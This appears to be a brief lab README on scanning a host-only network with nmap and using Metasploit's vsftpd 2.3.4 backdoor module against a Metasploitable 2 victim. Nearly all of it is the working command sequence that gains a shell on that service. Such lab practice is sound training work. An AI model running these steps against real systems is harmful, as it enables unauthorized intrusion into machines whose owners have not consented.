 #  Requirements
- Kali Linux (Attacker machine)

- Metasploitable 2 (Victim machine)

- Both must be on the same network or host-only adapter in VirtualBox/VMware.
   ## Step 1:
- Open a terminal in Kali:
-nmap -sn 192.168.56.0/24
-Replace 192.168.56.0/24 with your actual network range.
-Look for Metasploitable IP (e.g., 192.168.56.101).
-msfconsole
-search vsftpd
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.56.101
-set RPORT 21
-exploit
